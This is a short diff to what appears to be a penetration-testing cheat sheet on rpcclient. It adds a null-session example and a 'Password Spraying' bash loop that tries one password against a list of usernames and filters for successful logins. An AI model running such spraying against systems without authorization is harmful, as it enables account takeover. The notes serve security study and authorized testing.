@@ -3,8 +3,13 @@ tags:
   - linux
   - password-policy
 ---
+# Example Usage
 ```shell-session
 $ rpcclient -U "" -N <IP>
+```
+## Password Spraying
+```shell-session
+$ for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASS>" -c "getusername;quit" <IP> | grep Authority; done
 ```
 # Useful Flags
 - `-U'%'`: Authenticate with Null Session
